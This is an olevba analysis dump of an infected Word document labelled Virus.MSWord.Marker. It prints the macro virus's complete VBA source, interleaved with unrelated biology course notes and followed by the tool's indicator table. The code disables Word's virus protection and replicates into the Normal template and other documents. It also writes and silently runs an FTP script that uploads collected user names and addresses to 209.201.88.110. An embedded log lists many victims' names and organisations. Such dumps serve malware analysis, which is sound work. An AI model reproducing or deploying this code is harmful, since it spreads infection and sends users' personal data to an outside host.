olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-a6ed1057adc3aeace9b1cedf4216ad688f4ddc9b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-a6ed1057adc3aeace9b1cedf4216ad688f4ddc9b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error GoTo 0
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
    If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim B, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    B = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(B, B + l)
                Else
                    B = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(B, B + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            
            
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
Exitub:
               Next i
    End If
End If
End Sub





























































Private Sub Document_New()

'Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58
'YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM
'Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM
'Open Access Loves Nicky F. Also! 27/04/99 8:45:32
'Open Access Loves Nicky F. Also! 27/04/99 16:20:14
'Open Access Loves Nicky F. Also! 28/04/99 14:39:51
'Open Access Loves Nicky F. Also! 30/04/99 16:24:24
'Open Access Loves Nicky F. Also! 12/05/99 16:47:49
End Sub


'Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58
'YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM
'Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM
'Open Access Loves Nicky F. Also! 27/04/99 8:55:35
'Open Access Loves Nicky F. Also! 27/04/99 14:04:27
'Open Access Loves Nicky F. Also! 27/05/99 14:50:12
Unit 4 - Biological continuity and change
Area of study 1 - Genetic inheritance
Area of study 2 - Variation, natural selection and evolution


Unit 4, Area of Study 2 is divided into four parts.

      Variation in Populations
      natural Selection
      Evolution - the evidence
      Human Evolution

I will be looking at the first part, Variation in Populations.

Having completed study of this section, students should demonstrate:
- a knowledge of the causes of variation between individuals
ie. Environmental effects compared with genetic effects
     Sexual Reproduction
- the ability to investigate cause of variation in a population




Topics covered in Variation in Populations are:

      introduction
      Causes of variation in a population
           Genetic Effects
                mutation
                Sexual Reproduction
                Gene flow
           Environmental Effects
                Variation in Habitat
                Clines
                mutagens




introduction

     "In a relatively stable habitat, variation between individuals of a population can mean that some have a better chance than others of surviving to maturity and producing offspring. If environmental conditions change or new habitats are invaded, some individuals in the population, through natural selection, may be better able to survive and reproduce than others. In both stable and changing environments the inherited characteristics possessed by better adapted individuals are likely to become more frequent in the population. Mutation, environmental factors and migration of groups of organisms into or out of populations, can each alter the degree of variation present in a population with consequent effects on evolution."

p32, VCE Biology Study Design, © Board of Studies, 1993



Causes of variation between individuals in a population

The variations we see in the phenotypes of individuals of any single species can be quite spectacular. Look around a group of Homo sapiens and variation is evident immediately. Since we know that
                     Phenotype = Genotype + environment
we can conclude that the genotype, that is the DNA, of the individuals must be responsible for at least some of the variation we see.

In fact, if a number of individuals of a species have identical genotypes, usually as a result of their propagation by means of asexual reproduction, we observe that they also have identical phenotypes. Such organisms are often called clones.

However, if a number of clones, for example 20 identical azalea plants sold to 20 different people in a nursery, are subjected to different environments, the 20 different gardens to which they are taken home, they will surely display a variety of phenotypes in a number of years. Some of the plants will be growing vigorously and flowering brilliantly, some will be struggling, some will be covered with insect pests and some will be dead ... all from the same genotype!

The environment has a profound influence on the variability of the phenotypes of genetically identical individuals!

Such simple observations as these demonstrate the biological basis of variation and lead us into the consequences of that variation - Natural Selection and Evolution.



Genetic Effects

If variations in organisms' phenotypes are to be explained in terms of variation in DNA composition, we need to consider how such variation between individuals could arise.



mutations

A mutation is a change in the DNA of an organism which may or may not have an effect on the genotype and phenotype. Normally, mutations are rare and random events, but under certain enivronmental conditions, this may not be true.

Since DNA is a complex molecule, there is a number of ways it can be altered.

Base-pair substitutions occur when one nucleotide and its partner from the other DNA strand are replaced with another pair. Since these substitutions only occur at one site on the DNA strand they are sometimes called point mutations. Point mutations often cause no effect at all (not all DNA codes for protein synthesis), but minor changes to proteins may occur (if one amino acid is altered but not in a way that changes the protein's function too much), and occasionally such mutations may be lethal (protein product absent or non-functional).

Mutations which involve insertion or deletion of segments of DNA into a chromosome are also known. If these involve lengths of DNA which are not a multiple of 3 bases, the triplet code of whole exons can be changed - these are
then called frameshift mutations. Because long segments of DNA can be changed in this process, these are more likely to result in changes to protein products. Such changes are mostly for the worse, but at times an improvement to structure/function is the result.

It is often said that

mutations provide the raw material on which Natural Selection will act.


If this is true, the altered chromosomes need to be passed on to offspring of the individual in which the original mutation arose. In sexually reproducing organisms, this means that

Only mutations which occur during gametogenesis can be passed on to offspring.
Somatic (body cell) mutations die with the body in which they arose.


    
Sexual Reproduction

In order to understand why sexually reproducing species show much greater variation than asexually reproducing species, you need to review the details of sexual reproduction. Focus your attention on where the homologous chromosomes can go, and how not all the gametes from one parent are identical.

Meiosis is the process by which gametes are formed.
Gametes are haploid, but somatic cells are diploid.

During meiosis, chromosomes replicate and become entwined. During this period, breaks in homologous chromosome pairs occur quite frequently. This is known as crossing over and when enzymes repair the breaks, recombination of the strands of DNA occurs, but not necessarily in the original form. In this way alleles can "swap" from one chromosome to another, sometimes with marked consequences to the offspring which inherits the new combination.

Even if crossing over and recombination did not occur, the fact that the homologous pairs of chromosomes (with their individual allele compositions) are randomly assorted into the gametes makes many different sets of genes possible in the gametes.

(An organism with a haploid number of 3 can be shown to produce 8 different combinations of gametes, the relationship is N = 2h , where N= no. of different gametes, h= haploid no. of the organism. For humans, with a haploid no. of 23, this means that there are 8 388 608 ways those chromosomes may be combined in a gamete!) (No, you donot have to remember this ... I just find the idea fascinating.)

The final way that chromosomes and their alleles become dispersed through a generation is in the process of fertilization, the union of two haploid gametes, from different parents, to form a new diploid individual.

(In the above example, the organism with haploid no. of 3 could produce 8 x 8 different combinations of offspring from one pair of parents. For humans, the number is (8 388 608)2 or approximately 7.03 x 1013! You don't have to remember this either. And we still haven't factored in crossing over or mutations!)

Once the gametes have united in fertilization, the diploid zygote begins the long process of repeated mitotic divisions, each one resulting in diploid cells of identical chromosome composition.

Eventually differentiation of the growing mass of cells occurs and tissues, organs and functioning systems develop.  These are the somatic cells, all diploid, all containing the full compliment of genetic information, but differing in which particular genes are "switched on" in each cell type. A mutation in one of these cells may effect the functioning of that cell, and all those which form by mitosis from it. But unless the cell is a gamete producer, such effects cannot be passed on to future generations.



Gene flow

Gene flow is the exchange of genes between populations of a species.

For example, the various populations of magpies found in different locations around Australia do not usually interbreed, and they have observably different phenotypes in different areas. However, if some magpies migrate between locations, and interbreed with the magpies in the new location, their genes have 'flowed' out of the original population and into the second population.

This introduction of new genes into a population is often beneficial as it may supply the so-called hybrid vigour that increases the survival potential of the next generation of individuals.

Can you think of another animal species where interbreeding between previously isolated populations is allowing gene flow between groups? (Keep reading this page, you'll find the answer later.)





Environmental Effects

We already know that the environment can play a significant role in the phenotype of individuals. Nutritional requirements must be met, disease can alter phenotype and physical damage is always a threat to individuals. Other environmental factors can be shown to play a part in altering DNA, or in selecting for certain individuals.



Variation in Habitat

The earlier example of a clone of azalea plants taken to 20 different habitats provided a somewhat artificial example of the effect of habitat ( = living place) on organisms.

In nature, this can be seen to be true in populations of organisms, perhaps living close to each other, but in an area where there is a gradual change in some feature of the environment. Some of these features which may effect the growth and survival of plant or animal species include:

· Water availability
· Nutrient (food) availability
· Temperature range
· Altitude
· Shelter from wind
 
As the population's exposure to the environment changes, some individuals will be better able to survive there than others of the same species. The reason for the difference in the ability to survive is in the genes of the individuals. But it
is not until some factor in the environment reveals the survival advantage some individuals possess, that such a genetic difference becomes important. This is the basis of Natural Selection.



Clines

Gradually varying phenotypes and genotypes of a species over a range of geographic locations are called clines. A species that varies with geographic location in this way is said to show clinal variation.

One of the most obvious examples of clinal variation is in the population of the species Homo sapiens. If we consider the many groups of humans in the world that we call 'races' this idea of clinal variation is well illustrated. Although we all belong to the same species, different environmental pressures have, over time, selected for different phenotypes (and different genotypes) in different geographical locations.

With the ease of world travel these days, many H.sapiens are moving away from their traditional geographic locations. Gene flow is occurring between the groups and some interesting, and often very beautiful, offspring are produced.



mutagens

A number of physical and chemical agents in the environment, known collectively as mutagens, can interact with DNA to increase the frequency of mutation.

Some mutations have been shown to be temperature sensitive, that is, the altered protein functions normally at a certain range of temperatures, but not outside this range. If this type of mutation extends the range of tolerance of an organism, it could be of great benefit. In practice, such mutations generally reduce the tolerance limits of the protein and so are disadvantageous. With the current trend towards global warming due to the greenhouse effect, such temperature sensitive mutations may become important in the survival (or not) of some species.

Radiation, such as in X-rays and ultraviolet rays, may be increased in the environment due to human activity, but a constant natural source of such radiation is the sun, and this is undoubtedly the reason for some of the spontaneous mutations which occur with measurable frequencies.

Mutagenic chemicals can be the product of bacterial metabolism, viral activity inside cells, digestive processes or non-specific defence to foreign organisms. In recent times, human activity has added many new chemicals to this list.

As stated before,

mutagens and the mutations they cause
can produce somatic changes in eukaryotes,
or
they can effect developing gametes.

                           The outcomes for evolution are vastly different!












Private Sub Label1_Click()

'Open Access Loves Nicky F. Also! 8/06/99 20:39:59
'V.U.T Loves Nicky F. Also! 9/06/99 18:53:21
'Hien Loves Nicky F. Also! 6/10/99 7:57:15 AM
'Huy Nguyen Loves Nicky F. Also! 6/28/99 11:02:24 AM
End Sub
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:37:56 AM - Tuesday, 29 Dec 1998
' Dan Ross
'



' 09:50:06 AM - Monday, 11 Jan 1999
' Karen M. Pinks
'



' 04:41:03 PM - Thursday, 21 Jan 1999
' george w. connelly
'



' 06:35:17 PM - Tuesday, 26 Jan 1999
' lynn ann casey
'



' 10:10:39  - Wednesday, 27 Jan 1999
' Jo Baldock
'



' 10:49:33 AM - Monday, 1 Feb 1999
' Richard P. Panico
'



' 05:11:22 PM - Wednesday, 3 Feb 1999
' Jennifer A. Johnsonj
'



' 02:03:10  - Tuesday, 9 Feb 1999
' Coles Myer Ltd.
'



' 05:05:46  - Wednesday, 10 Feb 1999
' Coles Myer Ltd.
'



' 02:04:06 PM - Monday, 22 Feb 1999
' Sally Papworth
'



' 12:39:10 PM - Tuesday, 2 Mar 1999
' Coles Myer Ltd.
'



' 06:58:41  - Wednesday, 3 Mar 1999
' Sonja Mills
'



' 12:02:55 PM - Tuesday, 16 Mar 1999
' Coles Myer Ltd.
'



' 04:44:14 PM - Wednesday, 24 Mar 1999
' RMIT University Library
'



' 11:47:20 AM - Friday, 26 Mar 1999
' RMIT University Library
'



' 07:42:40 PM - Tuesday, 20 Apr 1999
' RMIT University Library
'



' 12:19:56  - Friday, 23 Apr 1999
' Phi
'



' 10:13:02 PM - Wednesday, 5 May 1999
' ***
'



' 06:10:32 AM - Saturday, 29 May 1999
' Huy Nguyen
'



' 07:45:25 PM - Monday, 31 May 1999
' Huy Nguyen
'



' 03:18:50 pm - Thursday, 1 Jul 1999
' VUT
'


'VUT Loves Nicky F. Also! 23/07/99 12:43:05 pm


'VUT Loves Nicky F. Also! 29/07/99 3:48:39 pm


'VUT Loves Nicky F. Also! 5/08/99 11:14:05 am


'VUT Loves Nicky F. Also! 5/08/99 11:57:56 am


'Building M Open Access Lab Loves Nicky F. Also! 11/08/99 12:50:02
'Bulbing M Open Access Loves Nicky F. Also! 11/08/99 14:06:53


'Building M Open Access Lab Loves Nicky F. Also! 18/08/99 11:21:01


'Building M Open Access Lab Loves Nicky F. Also! 1/09/99 11:49:55
'Building M Open Access Lab Loves Nicky F. Also! 1/09/99 13:04:13



' 04:49:27  - Thursday, 9 Sep 1999
' Building M Open Access Lab
'



' 03:25:58  - Tuesday, 14 Sep 1999
' Building M Open Access Lab
'



' 03:44:46  - Thursday, 16 Sep 1999
' Building M Open Access Lab
'



' 05:53:35  - Wednesday, 6 Oct 1999
' Building M Open Access Lab
'



' 04:57:02 PM - Wednesday, 27 Oct 1999
' lib
'



' 09:22:12  - Wednesday, 3 Nov 1999
' A.C.U.
'



' 10:37:49  - Monday, 15 Nov 1999
' A.C.U.
'



' 04:51:32  - Monday, 15 Nov 1999
' St Kevins College
'



' 04:00:42  - Tuesday, 14 Mar 2000
' michelle zahra
'



' 08:58:13 AM - Wednesday, 10 May 2000
' Temp Team Temp Team
'



' 08:24:10  - Monday, 15 May 2000
' Justine Poulson
'



' 01:48:39 PM - Monday, 15 May 2000
' Chad Ore
'



' 01:51:25 PM - Tuesday, 16 May 2000
' Chad Orr
'



' 05:34:36 PM - Tuesday, 23 May 2000
' Chad Ore
'



' 08:21:16  - Saturday, 24 Jun 2000
' BRIAN QUINN
'



' 02:10:59 PM - Tuesday, 6 Feb 2001
' bquinn
'



' 08:01:49 PM - Monday, 12 Feb 2001
' gorour
'



' 01:04:01  - Thursday, 29 Mar 2001
' Computer Services
'



' 06:00:12  - Monday, 16 Apr 2001
' Computer Services
'



' 10:52:05  - Friday, 27 Apr 2001
' Computer Services
'



' 05:31:20  - tiistai, 5 kesä 2001
' Virus Lab
'



' 06:10:57  - tiistai, 5 kesä 2001
' Virus Lab
'



' 12:37:05 Grunge - Tuesday, 19 Jun 2001
' Replication System
'



' 11:13:01 odp. - středa, 4 VII 2001
' Pavel
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

